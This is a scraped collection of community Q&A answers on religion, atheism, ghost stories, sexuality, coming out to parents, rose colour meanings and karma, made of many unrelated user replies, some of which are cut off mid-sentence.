So Christians, Muslims, Jews, and atheists all believe that atheists will not go to heaven, so the answer is most likely no unless some other religion in which atheists do go to heaven turns out to be the correct religion.|`|I0aosHnuaa	I only heave if I get too pissed ...

6YPNM71Iaa	i have one that actually happened to me.  well acually i have 2 stories    so once i was in my room when i was little and my door was wide open cuz i was a scaredy cat. so one night my whole family was asleep and the hallway light went on.  then i saw a shadow against my parent's door. and the bathroom door kept on opening and closing. it was so scarey that i was pertified and i couldn't even talk.  i was awake all  night looking at the shadow and im pretty sure i saw the shadow a knife in it's hand.    and the other one when i was little i was at my babysitter's house and her daughter had a club house that looked like a little mini house. and we were listening to like little kid music on the radio.  and all the sudden the radio changed to this really creepy channel and the music sounded like music from a scary movie. so we changed the station and it changed back. so we turned it off and it turned back on. so we were freaked out. my friend looked out the window in to this scary alley behind the mini house. and there was stuffed head or a scary mask hanging by a nus from the tree. it was so scarey! and wen we went back to show my brother it wasn't there anymore and no one ever believed us.|`|wnI04x8Kaa	The Book of Revelation, also called Revelation to John, Apocalypse of John|`|TycCeqtaaa	okay this  is for real:    Have you ever heard that if you happen to see death (as in like the grim reaper) your going to die?    My grandfather and my dad's uncle were walking home late one night, it's a long road from the town to my grandparents ranch and they didn't have a car. (This was in Mexico btw)  So as they were walking home they saw what looked to be a girl figure walking some feet in front of them. She was wearing a hood and was dressed in black. Of cource my uncle and grandpa like  the boys they were started saying things to her.  Then she stopped mid-stride and when they caught up to her my uncle reached over to her and touched her shoulder. She then turned around and took off her hood only to reveal that her face was all bones.  As soon as this happened they ran  home.  Some time later they died with 2 other men in their truck on account of falling into a really deep ditch.

There does not seem to be enough space. That is why I would send you to a sight where you may read my story.But I will try an excerpt from my story..     Jan walked near to where I stood looking down at the "sleeping" old man. I looked up at her and said, "He needs a blanket he's so cold!" I knelt down near his head and reached for his big brimmed straw hat that covered his face, "And we can't seem to wake him!   As I pulled the hat away his head rolled to one side and it rolled and rolled till it hit the trunk of the old willow tree.Jan drew a deep breath, quickly turned me around to face her "Girl he'll be OK. Go fetch up your daddy." said Jan in a stern, somber tone.   We promptly went and told our father what we thought was going on. That Pawpaw was sleeping under the old willow tree and was very cold, he needed a blanket and Jan had sent us to get him for some reason. His eyes grew wide and a bit frightened; his hands seemed to tremble slightly and with his voice starting to crack a bit, made us promise that we wouldn't leave the house. He grabbed an old blanket from the cedar chest at the foot of his bed and ran over to the Terry residence.My sister and I had no idea why folks were acting so strangely. So we sat in our room playing with puzzles and wondering what was wrong with Pawpaw till someone came to get us. (I never mentioned what I had seen to anyone and could not even acknowledge it even to myself. His head just rolled away, how could that be? It must have been some sort of trick.)   It was nearly 2 hours we were exiled to our room. During which time we'd heard a siren blasting loudly then abruptly stop. We went to the window to see an old black and gray car that looked more hearse than ambulance with young men in dark uniforms putting some sort of bed in the back of the vehicle. I thought that it may have contained what might've been Pawpaw Porter. We started to worry that he was gravely ill or even dead. "You can't get any deader than having you're head off, could you? But it just had to be some sort of a trick!" I thought to myself.  However I said nothing to my little sister who was only a very small child at the time. Daddy and mommy came to our room and said that we were going to have supper at grandma's house. Nothing more was said about Pawpaw that day.   One week later we were instructed to put on our best dresses and get in the car. I didn't give it much thought as to where we were going I just loved to dress up and go just about anywhere. So I put on my navy blue dress with the small white polka dots, found my little white cloves, my pillbox hat and matching shoes, I was set to go. My little sister however didn't much like to wear the frilly dresses and fussed the entire trip.   We arrived at a huge dark gray building that I thought must've been a church of some sort. It was getting cold and even a little dark as we walked inside. There were folks that we'd never met before smiling at us and saying that we must have been a comfort to the old fellow in his last days. It was all pretty strange to us as our daddy never before had gone to church.  (He was a devout Atheist and wasn't afraid to tell others so. He also used to damn people to hell, use the Lord's name in vain and often shouted "I swear to god that I'm gonna kick that guy's ***!")  Not what I would call someone who didn't believe in some sort of a higher or lower power. Yeah, I'd say this was getting pretty weird!  Daddy and mom were busy shaking hands and singing a guest book, so we wondered off. In a small room adjacent to the chapel there were lots of pretty flowers so we walked inside only to find our dear friend Pawpaw lying in the center of the flowers all dressed in a black suit white shirt and tie. It was at this point that it hit me that our dear playmate was truly dead.  Sylvia ran up to the casket and shouted, "Wake up Pawpaw! We've missed you so very much! Wake up wake up and give us some candy!" she began to cry and attempted to climb up on to the coffin to jump on the "sleeping old man" in order to wake him up. I saw Pawpaw's eyes begin to open his hands to move and just as I thought he was about to speak, some of the people outside heard the commotion, ran in and took us back to our folks. My little sister cried and cried. "Why wont Pawpaw wake-up!" she exclaimed. (I wasn't sure if anyone seen what I had. But I was getting pretty darn scared)   My folks seemed dumfounded and did not know how to explain to my sister the plain truth that Pawpaw was dead, or perhaps it wasn't death that had dumbfounded them. Anyway it fell to me to tell her. I didn't want to scare her anymore she was very upset that Papaw wouldn't wake up. So I had to be gentle she was just a little girl, and my baby sister.   As we all filed into the chapel I clasped my sister's tiny hand and told her that Pawpaw was so tired that he went to heaven to sleep and that someday if we were ver|`|65b692f246c30bf5925be40480e64aa4aa	the story of albert fish on wikipedia is p. scary O_O|`|XMzicF0Xaa	See josef megele's story in wikipedia ^^ , it scares me a lot

'What beautiful animals'!   He said to himself.     As he was walking alongside the river, he heard a rustling in the bushes behind him He turned to look. He saw a 7-foot grizzly bear charge towards him.  He ran as fast as he could up the path. He looked over his shoulder & saw that the bear was closing in on him.     He looked over his shoulder again, & the bear was even closer. He tripped & fell on the ground. He rolled over to pick himself up but saw that the bear was right on top of him, reaching for him with his left paw & raising his right paw to strike him.   At that instant the Atheist cried out, 'Oh My God!'     Time stopped....  The bear froze....  The forest was silent....    As a bright light shone upon the man, a voice came out of the sky.

Allahu 'alim.     To the Muslim lady involved, assuming I am talking to her direct, to make this answer flow more easily I will say.....  In your repentance you would have to be sincere....genuinely sorry...that is you feel that you have wronged your soul and do not want to ever repeat your evil ways...and not just that you are sorry because you have been caught out, or that you fear the punishment from Allah subhana wa ta'ala though the latter should be in your mind too. Make some effort by way of repentance....offer much dua'a, prayers and fasting, dhikr, and sadaqa and then have some hope in your heart. You have to reflect more on the Holy Qur'an too. Dhikr (remembrance) is important because if you had truly believed in your heart that Allah subhana wa ta'ala sees all and in your heart you truly did fear his wrath you would not have done the evil deed(s). Well only Allah subhana wa ta'ala knows what is in your heart. Don't disclose your sins to others either as you cannot offload guilt that way and it gives others the wrong ideas...Your guilt is between you and Allah subhana wa ta'ala.     Salam.

Say, a bird does his droppings upon your scalp, I would infer that God is trying to explain to you that this person you love does not yet love you unconditionally and irrevocably as well. However, if a beautious monarch lands upon your eyelashes, God is letting you know you are in love, with a person who loves you as well. The time to admit to love is when you feel you truly know and love this human with all of your heart and being, and when you feel the love shall be returned.|`|6w4O7701aa	You will not have to ask when the right time is. You will know and feel it in your heart when the time is right. Women's intuition pays off a lot of the time too.
RermzbWgaa	Music that speaks to emotion and the creation is not evil in and of itself.   Music is art that stirs emotion in us.  It is fine to feel emotion concerning life experiences and the beauty (or otherwise) of God's creation.    There is music out there that stirs one to sin however, or is blasphemous, glorifies evil, etc....that is not something that I would suggest.|`|AA11232725	Sins when listening to music are in the heart. If a person is saying "Amen, that's what I want to do" when sinful thoughts come their way then Jesus said that's as if you were actually doing the sin because you know it's wrong in God's eyes and you want to do it anyway.    So when it comes to listening to different types of music, the Bible doesn't contain a list of acceptable and non-acceptable music to listen to. Those kinds of issues are between individuals and God and what goes on in their mind when they listen to music.    Most Christians would say that a true Christian shouldn't really enjoy listening to music that glorifies sinful behavior and if someone says that they do then you have to wonder if that person is born again or just a mere professor of the faith.    I no longer like to listen to songs that I liked before I was saved that talk about getting drunk or doing drugs and going out and having sex with a pick up because I'm like "That's NOT what I'm going to do" so I don't really want to hear about it even if the music behind the lyrics is good.|`|2Hot9EJiaa	I am a professional musician who is a Christian. And I both play, sing and listen to other music besides Christian.  I can tell you this though, I have turned down a couple of music jobs in my life, because they went against the beliefs that I have, and went against the Word of God.  If the music you listen too does not say anything in it that would be called sin in scripture you are fine.  For those Christians who say we should never listen to anything but Christian music, reminds me of the Pharisees in God's Word.|`|9mLjDa5kaa	Believers in Jesus have liberty in Jesus.  Listen to whatever you want.|`|uiTkwGBNaa	Do not be deceived. Some of your praise and worship songs woo you into a false sense of sentimentality thinking you're close to God, then you go home and yell at your wife and seek after the things if this world.  Also, not all "good" things are beneficial for spiritual growth.|`|T5ztIAZbaa	We have the liberty to listen to what we want, so long as it's not the "bad" stuff.    I listen to trance all the time :)|`|jCFxWmenaa	christians are sinning when they do anything|`|k5quFjO8aa	that is just sooo narrow-minded. i personally do NOT think that.|`|LsduvqHMaa	I think caps lock produces the vibe of shouting.    And I find that extremely rude.    That's what I think.|`|2tR5zKEuaa	Well yes. If the message is sinful. The instruments or the way the voice sounds have nothing to do with it. What you feed yourself is a reflection of what you have in you. If you enjoy something sinful how is that a good thing?|`|ypVQlOJvaa	They told us so at camp years ago.  Any music that does not glorify god is evil.  I never believed it.    I'm an atheist who listens to Michael W. Smith (I think he is a genius.)  Crazy old world, huh?    : )    .|`|yu53u5TFaa	Your all-loving, all-forgiving, all-compassionate God will send you to hell forever if you listen to anything other than Christian rock.
3xZLBkuZaa	"Pod??aj za sercem" or "Id? za g?osem serca". The second form means literally "follow the voice of your heart", but it sounds more natural in Polish.|`|4jORxfKnaa	follow your heart is "si? twoje serce"
RyhluHk3aa	What totally idiotic question. If any person was drowning, and someone came to save them, I'm positive that the mention of the Bible being whatever. will be the last thing to come out of their mouth.     To humor idiocy, yes. I would still save them.|`|l1ctIW7eaa	ha, have a star *|`|uiTkwGBNaa	Of course! and I'd ask him if he wanted a towel.  My love is not conditional on if i think he will be saved from his sin one day, rather he is my neighbor and my enemy.|`|biPAZ2TVaa	Yes.|`|p6wwiQG3aa	Of Course, the poor suckers going to hell. Let's give him a few more days to come to his senses      also why I am against Capital punishment|`|7kJFmyxdaa	Of course I would save him. How would I know he was an Atheist and how would he know I was a Christian? It is not I would sit there an hold a conversation with him asking him if he believed in God or not. The man is drowning.  He is a human being just like I am.|`|1ffb5797d2e26ccb8eb17dd3db6e22c0aa	ummm yeah.. cause it's the right thing to do.. AND I'd probably.. knowing ME,  think,  "WHAT?  Did I hear that correctly?"  - cause in my mind I'd be thinking about "RESCUING" and not religion..thus his comment would catch me off guard and when that happens I question if I heard it right or not  and generally dismiss what I "thought" I heard until after I finish the job.      THEN,  minutes, hours, or days later,  when I wasn't focussing on rescuing him or the addrenaline wears off.. I'd be like "Wait.. I seriously think that guy said "screw chrstianity" as I pulled him out of the water..WOW!, what a total tool!  Here I am saving the guys life and he decides to use THAT particular moment to spout off his religious views and 1st off, how'd he know I was a Christian?  I forgot my "I'm a Christian!" badge in my other pants pocket..so how'd he even know I was a Christian???  Anyway.. what an a__hole!"    Honestly -- that's what I'd do.|`|3oCdTWYZaa	Some of them would save us :)  Because they'd be like, "Oh, maybe he could change his mind about our faith later on! :)"|`|h1eBWehMaa	yeah, but after i save him i would beat the sh*it out of him, i would still save him though|`|Ynsow6qbaa	Yeah why not.|`|QVFjO5m0aa	Well now you owe your life to a christian.|`|AyPF2TFlaa	Of course I would, I love Atheists even though their wrong but that's life.

Days later, I'd give them a call home, to thank them again for saving me...      "Phew! Thanks dude, if you hadn't saved me, no one would've been able to drive my girlfriend to the clinic to have a proper abortion! Now, some pals and I are organizing a Pro-GLBT rally, wanna join? It's free!"|`|lPgtxWRhaa	How would I know if he  was an atheist or anything else?  Would an atheist help a Christian if the situation was reversed?  I would still save him regardless of his attitude.|`|aL8Pj3dtaa	yes of course, just because we are christians and you say something like that doesn't mean we will loose our heart.|`|4293cf50016bde6c1a79ccb90dbe6c96aa	Absolutely.  This would give me more motivation to save them.  So they have the opportunity to find the love of Christ here on this earth.|`|FqApS4tjaa	Why wouldn't I?
nQW1MSMpaa	Some people don't understand bisexuality, thinking it is just about the sex, not realizing that it is forming the same emotional bonds with both genders that heterosexual people do when they fall for somebody.    When you have a crush on somebody, you have a crush on somebody, it is not something that you can control, you don't 'choose' to turn it on or off. You don't get out of bed one morning and say to yourself , 'oh, I think I might have a crush on a boy today'. It doesn't work that way.    I had a crush on my best friend too, when I spoke to him about it he wasn't interested (he was straight). We still talk, but we are not as close as we once were - this is the chance you take. You might want to wait a while to see if you get any signals from him first, but remember, you are living in your Mother's house, and she makes the rules.    The only problem with this is, your friend might ask you why he can't sleep-over anymore, if that was something you did regularly. This might precipitate the question being asked.    I wish you luck, and also suggest you get in touch with PFLAG.|`|H2IqzG12aa	Taking a step back, this is what adolescence is all about, learning that your parents are often WRONG and learning to step out on your own and make adult decisions for yourself.  It's great when parents are supportive, but they often aren't when it comes to sex.  It's painful to learn that your own parents aren't perfect like they always led you to believe, but again, that's just part of growing up.    I doubt that any school in the Western world today would toss out two kids for having sex, regardless of genders, unless it was a private school or they were "experimenting" in school.    The older you get, the more freedom and independence you'll have.  Hang in there, you have your whole life ahead of you, to shape any way you want.  "This above all, to thine own self be true."|`|HgRYP3cJaa	It's hard for parents to accept the fact that their kids are not the wat they want them to be. I've seen so many kids messed up by the way their parents treated them, it's sad.  Your mom should be glad you talk to her and share things.  My daughter and i share everything and I'm so glad.  Our house is the one everyone else came to when their parents threw them out. Her best friend was kicked out for being 'too gay' in his senior year...he moved in with us.  He's in college now and rarely ever sees his parents.  Wonder how they'll fell when they old and alone?   Keep talking to your mom.  It IS ok to be gay.  You  need to be who you are, not what other people want you to be. Try to explain that to her.  It will get easier when you're in college.  Never give up.  Always be true to yourself.|`|PpKJIT0aaa	I'm with you on this.     You are her son, sure, but you have the RIGHT to your own happiness, and to love, regardless of the form that it comes in.     I suggest you contact PFLAG and tell them what's going on. They are fantastic at dealing with this sort of thing. Also freetobeme.com    PFLAG is Parents and Friends... so they will be able to put your mum at ease, and get her to overcome her fears (including that she has 'failed')...    Good luck.|`|YlMR42agaa	Awww.:( i am sorry..........My MOM IS THE SAME FREAKING WAY!!!! I just went to the school counselor and talk to her.

Others don't.  I'm guessing you're still in HS.  This is the time in your life when you begin to pull away from your parents and establish your own life.  Your mother will come to realize that soon enough, but for the moment she is worried about you and she probably knows next to nothing about orientation.    It is easy to say "hang in there and it'll get better."  It's much harder to do.  But it will get better.  For the next few weeks and maybe longer, you're going to have some emotional upheavals with her.  Just try to be restrained and turn to your friends for emotional support.     Once you're old enough to be on your own you can grab the reins of your life and lead it the way you know it is supposed to be.|`|SsEAvhs7aa	Ask her if she really wants you to let her down as soon as you're out of her house. If that's not what she wants, tell her to get some help. Not for you, but for herself.|`|bd89db95a8636a616e42896cf49b6a87aa	How old are you?  If you're 16 or under, you'll just have to deal with it for a while.  Get a job and start saving up money.  Then when you turn 18, move out.    Don't try to change who you are.  But you live with your mother, and you have to respect her, at least for a while longer.|`|cuD8tQy7aa	" i wish it was okay to be gay "    It is okay!  it's okay to be Bisexual or Gay!

Goodluck in the rest of it all, i'm rooting for you! ^^|`|BU6pYizfaa	if she's that unaccepting, find a friend who would let you stay with them and leave a letter for your mom(don't tell her where you are going). Explain to her in the letter that you feel unaccepted, tell her to call your cell when she is ready to be nicer, i garuntee you that a few days without you, she would realize how much she actually loves you. But there is nothing wrong with being gay.
nQW1MSMpaa	Guys don't become gay, although they might become to understand that they are.    When you grow up in a heterosexist world, in a heterosexual household, with heterosexual messages all around you, you might take some time to come to the understanding that you like people of the same sex. It isn't that you 'become gay', it is just that you have finally come to the understanding of your own sexuality.|`|pYn2L2DHaa	Guys don't become gay -- they're recruited around the time they're 12 or 13 by recruiters from the Homosexual Institute of America (HIA).    Not everybody can become homosexual.  Boys who are not academically gifted or who do not have talent in cooking, music, art, theater, and writing are often -- but not always -- ecluded from The Homosexual Institute.    Other disqualifying factors are prior sexual experience with... ... ...women, skill in auto mechanics, lack of attention to grooming, poor taste in clothing, inability to accessorize correctly, and participation in spectator sports such as the Super Bowl.  Athletic ability is also considered a negative factor, but occasionally athletic boys are admitted to The Homosexual Institute on probation.    Once admitted to The Homosexual Institute, the novice is instructed in interior design, fashion design, gourmet cooking with specialties in at least three international cuisines, classic movies, gay culture and gay icons, dance, and the ablity to throw together a successful party for 30 people on three hours' notice.  The training is rigorous, and not all postulates complete the coursework.  Those that do not complete the coursework are expelled from The Homosexual Institute and sent back to a banal, heterosexual existence with a wife, 2.5 kids, a dog, a house and a white picket fence lived in grayscale.|`|HgRYP3cJaa	a better question is why are some people so stupid?|`|RKhSRMlZaa	They don't "become" gay.  They are born that way.  It can be from any number of environmental factors to just they way they were formed.|`|N73oZyY8aa	At conception and for quite a while afterwards, all fetuses are essentially female. Sometime during gestation something happens in the womb that triggers which gender will develop. Consider reptiles, alligators for example. The temperature of the nest at a specific time determines the gender of the hatchlings. Similar things happen in the womb.    Now sometimes, as an example, the transformation is incomplete. That is where, scientist and other learned individuals believe, that transgendered people come from.     Now as for gay people, they believe that some similar process takes place when the hypothalamus is developing. That is the part of the brain that determines orientation. Therefore, and I'm not saying specifically temperature, gay people are born gay.|`|b371fd5225e0f0948944cb7d323618b7aa	they put their heterosexuality under their pillow and the queer fairy sprinkles rainbow dust over their bed. then you wake up gay.|`|MhfneF0xaa	The majority of LGBT people believe that gays are born gay, and I can't argue with them, except to say that I don't know of any definitive studies proving or disproving this.    My own personal opinion is that while some may be born gay, others may be influenced in that direction by early childhood relationships with the parents. I also acknowlege that there are not (to my knowlege) and definitive studies showing this.    It is widely held, however, that once the sexual orientation of a person has been established, it is virtually impossible to alter that orientation, even if the person involved very much wishes to do so.    Behaviour may be controlled, but orientation cannot, as best I can tell.|`|tEn2nnsuaa	gay guys are born gay.|`|RSv2E2KNaa	They love men.|`|kc1IBYMRaa	They don't become gay, they are born gay.

GBjMqElBaa	It is important that you know your own faith well first. And I would not 'try it" (in the experiencial sense) but rather learn about it and how it compares to my own.  I have a background in theology and have studied many other religions. In fact I just finished a brief report ( approximately 88 pages) for a friend of the family. I called it Astral Projection To Zoroastrianism. It covered 25 different world religions. She was curious about other religions and so I did the report. I also pointed out where there are sharp differences with her Christian faith.   It is wise to be secure in your faith, and be able to explain why you believe what you do. If not, you may want to look at that first. Assuming you are a Christian, you may want to read "I Don't Have Enough Faith To Be An Atheist" by Norman L. Geisler and Frank Turek. They give some good reasons for being a Christian.  If you go to   http://www.lcms.org/pages/internal.asp?N...   you will see a list of some world religions. click on one and check it out.  If you go to www.gotquestions.org they have a lot of information on various sects, denominations, and religions. Just put in what you want to search for.   You may find it can actually strengthen your faith by studying other religions. You may be better able to defend why you believe what you do.   We are told in 1 Peter 3:15 "Always be prepared to give an answer to everyone who asks you to give the reason for the hope that you have. But do this with gentleness and respect."  We won't be able to give much of an answer to other faiths if we do not understand them at all. Of course, we need to know ours well first.    I have questioned MANY things about my faith and others. Through this I have grown stronger in my Christian faith and better able to witness to others.|`|315e05cc268b43fe093093a9e96280b8aa	Knowledge is power, ignorance is the enemy.|`|ATsdSM7saa	If you are being forced to stick in a religion then it is not the religion for you|`|3oCdTWYZaa	No, it's called being open-minded if you explore beyond your own :)|`|5lbKGofgaa	No.  Where did you get the idea that all other religions are Satanic?You're dumb.|`|KQGF9UEraa	Nothing wrong at all, in fact it makes you less ignorant and may give you more understanding of your own religion.

Purple, coral and orange challenge red as the color for Valentine roses. The rose color meanings for these 3 are as follows:   The specific purpose of purple roses is to signify that the giver has fallen in love with the recipient at first sight.   Meanwhile, coral and orange roses signal desire.         The meaning of yellow roses is joy and friendship.       We express our gratitude and appreciation with pink roses....       While feelings of admiration and sympathy find words with roses that are light pink in color.       Peach is more ambiguous, as it can signify either sympathy or gratitude.       Their purity naturally enough lends to white roses the meaning of reverence and humility.     What about black roses? Do they exist and, if so, what is the meaning? While no jet-black rose exists, there are some of such a deep red as to suggest black. E.g., Rosa 'Black Magic.' Alternatively, some florists dry fresh roses and dye them black. And the meaning? There is some disagreement on this point. Many say black represents death and can thus be used as a symbol to express vengeance towards a foe. But others interpret that more liberally, suggesting as a meaning for black roses the death of old habits, thus signalling rebirth.     HOPE THIS HELPS!~?|`|Co3N6BS3aa	A tinsy box of chocolates or something.    I'm in High School (an all girls one) and we have a valentines exchange with the guys school.

First, there are many practical problems. For example:<br>  1. We must ask, why does one get punished for something he or she cannot remember having done in a previous life?<br>  2. If the purpose of karma is to rid humanity of its selfish desires, then why hasn't there been a noticeable improvement in human nature after all the millennia of reincarnations?<br>  3. If reincarnation and the law of karma are so beneficial on a practical level, then how do advocates of this doctrine explain the immense and ever-worsening social and economic problems - including widespread poverty, starvation, disease, and horrible suffering - in India, where reincarnation has been systematically taught through out its history?<br>  There are also many biblical problems with believing in reincarnation. For example, in 2 Corinthians 5:8 the apostle Paul states, "We are confident, I say, and would prefer to be away from the body and at home with the Lord." At death, the, the Christian immediately goes into the presence of the Lord, not into another body. In keeping with this. Luke 16:19-31 tells us that unbelievers at death go to a place of suffering, not into another body.<br>  Further, Hebrews 9:27 assures us that "man is destined to die once, and after that to face judgment." Each human being LIVES ONCE as a mortal on earth, DIES ONCE, and then FACES JUDGMENT. He does not have a second chance by reincarnating into another body.|`|li6nGXpKaa	Some are payed back on earth...while others  slide by...like they never did anything wrong to anyone....their payback comes when they enter hell.|`|FlOEH2UGaa	The Christian Bible also makes many references to this belief.<br>  That "living in the flesh is needful". And "we answer for everything done in the flesh".<br>   And life experience too proves this fact.<br>   There is justice. We just don't always get to see it. Someone might steal from us. But he may be beaten later by one of his criminal friends, or in a drunken brawl.<br>   What goes around comes around. And I feel now that we are<br>  coming closer to the Time of great upheaval and spiritual changes. That our Karma is coming to us much more quickly. As if our Creator is working the Karma out faster so those who<br>  believe in the One High God, will be purged of evil energies, and be able to be raised up to the Higher worlds.|`|MAkfZQlsaa	yah we believe the janana marana chakra(karma cycle),what  we sow we reap.according to our past deeds we reap.if we do good we get good janmas and when we do bad we get below average and least janmas.according to the karma we get the result.|`|XSLb8P95aa	A person who lies dead looks so dead that there is no possiblity of any life hereafter.Where does one go?Does an Indian when he dies go to Mongolia or his soul gets into the nearest buffalo?The karma theory was floated by those chaps with vested interests to feather their own nests so that people listen to them and their so called wise sayings.We will not be here a second time even by a miracle.We are here only once first and last.Even if for a moment we say that we have a second life or third,what is the use at all if it has no link OF WHICH WE ARE AWARE OF AND STAY CONNECTED TOO,to the previous life?One does not know a thing about his or here previous life and so what is the proof or use in saying all the time that we had so many lives.It is all just nonsense.Once dead it is adios for good.|`|Y3NsAf1haa	The cycle of reincarnation is effected by karma.  Karma, good or bad, is what determines if a person reaches Nirvana or returns into the cycle of reincarnation.<br>  <br>  The bible says "it is appointed unto man once to die and then the judgement".  Even Hindu beliefs and Buddha did not see reincarnation as an end in itself, but something to be avoided if possible.  The problem is that there is no certainty that a person has been 'good enough' to reach nirvana or even prevent themselves from being reincarnated as a lower life form. Not very comforting.<br>  <br>  Christianity, on the other hand, is very specific and very simple.  Believe that Jesus came to free us from sin and accept this free gift.  In this way we are reunited with God, our Father who loved us so much he was willing to sacrifice his own Son to save us.<br>  <br>  Karma is a sad way to see life.  If my child is born with Down's Syndrome, it is because of either their past bad Karma or my own.  Either way, where is the peace?  Where is the joy? <br>  <br>  In Christ we are given forgiveness, Joy and God's free and unending love with one simple statement. "Yes, Jesus"|`|da35fd659aa05b3e977762d95880269caa	Yes, I do believe in the cycle of Karma.<br>  <br>  It is like believing in this universe and its  existence.<br>  Though wedo not know every thing of this universe and we are not able to prove every thing which is happenning in this universe, similarly, we may not be able to prove it with proofs, but certain instances have shown us that the cycle of  Karma also exists.

b9badec91c1e0895c8cf577c73523896aa	Living life well and to the fullest is about balance.  Too much of anything or too little is no good, which does not include the matters which are damaging to oneself.  It is important to have good relationships with people as well as finding satisfaction from yourself and your personal pursuits.  As far as career is concerned, I believe its important to enjoy the process of getting to a particular occupation, as well as the end result, having training or a profession in hand to make a decent income.  In the process, there is no way getting around it, there are sacrafices to be made.  Albeit, anything worthwhile in life has its price.  It is a matter of how we decide to look at the sacrifice that determines the state of mind we get into.  Due to our physical limitations, you can only be in one place at one time and/or your focus is limited, in order to achieve something you sometimes have to give up or delay something else.  Sometimes the direction which we choose turns out to be wrong for us.  Most decisions are based on some knowledge and a lot of imagination and fantasy.  Often, the reality of a situation is much different than we imagined it would be.  Although, this fact should not allude you because even if something isn't what we thought it would be, there is no job, neither any relationship, that is all good and perfect.  Situations need our input to improve them as much as they can be improved.  It is also okay to make mistakes, grow and learn from them and move on to a better place (within ourself).  The most important element is to have a good attitude in life and about the situations you get into, trying to draw the lessons out of them and coming out better for it.  All the above applies to career as well as the relationships in your life.<br>  <br>  Simply, in the short term I have had regrets, missing out on a party or some occasion.  In the long run, I do not have regrets because I have pursued what I wanted, realizing that I can't have it all and that I had to focus and put effort to achieve something.  I, for the most part, am satisfied with my accomplishments, mostly because through them I learned about myself, who I am and what I am capable of.|`|724820389d54fa818c31047875192a06aa	I don't think the best decisions at the time always are.  Looking back at my life, I realize that the obligations that I gave the most importance to really weren't as important as some of the things that I gave the less importance too.  Especially things like jobs and school obligations, both of which I took way too seriously.  Really, how important was a job at a pizza place compared to missing a friend's birthday?  At the time, it made sense to take my first job seriously.  Looking back, jobs like that were a dime a dozen but some of the experiences I missed out on were not.

5f568984c834bb49358fc78371558d20aa	Sure!<br>  <br>  1) Take up space.  Men sprawl, they lounge, they sit in their chairs with legs wide open, they gesture largely with their arms (but strong arms- no flailing about with loose limbs), they stand with legs apart.  Women tend to shrink themselves, so expand, and project.<br>  <br>  2) Be forward.  Men seek out eye contact and keep it, speak their minds, interrupt and interject into conversations more often, whereas a lot of women downplay all those aspects.  Be forceful (but within reason- alway remember that gentlemen are polite) in your interactions, and possibly even aggressive in your mannerisms- firm handshakes, slaps on the back, loud, hearty, real laughter, lots of noise and movement.  Try not to be accommodating- that is what women often do, trying to smooth things over and be the moderators.  For example- a stereotypical woman waits for her waitress to come back, sits her empty glass on the side of the table in hopes of drawing attention without being forceful- the stereotypical man has no problem calling her out to get him another drink.  Men also (supposedly) smile less than women, especially smiling that is meant to be conciliatory.<br>  <br>  3) Lock your body.  Stand up tall, chest out (even if you don't want attention to your chest), legs apart.  Men can be just as graceful as women, but if you want to rid yourself of femininity, try not to move with any sway- your hips stay directly below you as you walk and move very little, your hands should be firm entities that cut through the air when you gesture rather than flutter around in it.  Remember posture and bearing communicate a lot about you, and give off vibes of male confidence (or at least indifference).<br>  <br>  4) Observe men.  Watch 'em.  It's the best way to pick up tips.<br>  <br>  5) Be yourself.  I don't know why you're trying to be masculine, but an act is an act is an act, and if you aren't naturally masculine, then you'll always be working on how to act, and it's no way to live your life, constantly thinking about and tailoring your every move.  Much better to accept whoever it is that you are and love that, than try and be something you're not.  And remember that masculinity is somewhat subjective- not all men act the same, and masculinity is a hard concept to qualify.  You don't have to act like a stereotypical man in order to be masculine, you know?<br>  <br>  Good luck.|`|705bb9794e7f7982745b157f9432c000aa	stop acting and be yourself.|`|22e54c9cc06e8654277c81de6e249881aa	Wear a baseball hat, one earing, collared polo shirts, and constantly tug @ the crotch of your pants.<br>  Personally, I think a semi-butch lezzy is cute.<br>  <br>  Now if you're lookin' to go hardcore??

3b7faeeb790044b855c3b686cd7f6e41aa	For starters pacifism was brought into the focus of the mainstream America, a view which pushed patriotism to the side and forced many to look at events from a more rational and human aspect.

Assuming a man who marries a woman loves, her and does not want to stone her, it may have been to help the people understand just how wrong sex outside marriage is.

If you read the story of Sodom and Gemorrah Geneses chapters 18 and 19,shows that Abraham searched for a righteous person,but none could be found.God does not destroy anyone without warning them first. At Geneses 19:8 Lot pled with the men to take his daugters,but they wanted the men (or angels) that was visiting Lot.Lot was putting his trust in  God and his Angels to save he and his family and they did.It said from boy to old man was trying to attack Lot and his family.Thus they all were destroyed.  As in the days of Noah at Geneses 7:21,22 It says during the flood every living breathing thing on the face of the earth ,including children died.  Deuteronomy 22:22-24 Talking about adultery this was the penalty of death.If a virgin girl lay down with a man and didn't scream (showing her consent)then they were both to be stoned. And I think you meant a disobedient child would be stoned.This would be an encoragable person,it would be  one who would not listen from his childhood on into man-hood.    We need to understand the law ,and that was under the law that a wrongdoer deserving capital punishment was stoned to death.This was to clear out what was bad.All Israel would hear of the punishment and fear of such wrongdoing would enter their hearts.    But before a wrongdoer could be stoned 2 wittnesses had to give harmonious testimony,and thereafter they had to be the ones to cast the first stones.The prospect of being the executioner made a person think searchingly in giving evidence and doubtless was a deterrent to false testimony,which if discovered would cost him his own life.

I've grown tired of both homosexuals and anti-homosexuals making so much noise about it.  I'm no longer interested in hearing about it.  Enough is enough.  The only reason it became such a big deal was because the biggest loudmouths in both camps got to arguing about it and decided to use the government as a push-pull arena.    I believe it's against God's design and intention.  This means the following things to me:    1. If you are gay and decide to follow God, you can't keep participating it.  Yes, that means abstinence.  Everybody gasp now.  As soon as you get over yourselves, keep in mind that we all have something that is against God's intention for us and that we have to overcome.  It's different person to person.  Like I said, homosexuals aren't any more or less special than the rest of us.    PLEASE NOTE: I say overcome, not change or pretend.  For instance, I have my own things and I was born with them and I will always have them within me and calling me but I will not do them.  Capiche?    2. I don't support a gay Christian marriage, I DO support anyone having a civil union.  Again, do what you want, but don't make humiliate yourself by mocking Christianity AND forcing everyone to go along with you.    3. Whatever you want to do, do it.  If that entails you being your God and you making the rules based on what you like, then go for it and I wish you all the best.  If that entails you being a Christian, then be a Christian and not a cherry-picker who wears a cross.    I'm sorry that we've found ourselves in a climate where if you disagree with homosexuals then you're dog meat.  But it is what it is, and I'm not going to be dishonest and bend the rules for you just to avoid getting yelled at by a bunch of trendy wusses who are afraid to stand up and stick to the definitions.    God bless you.

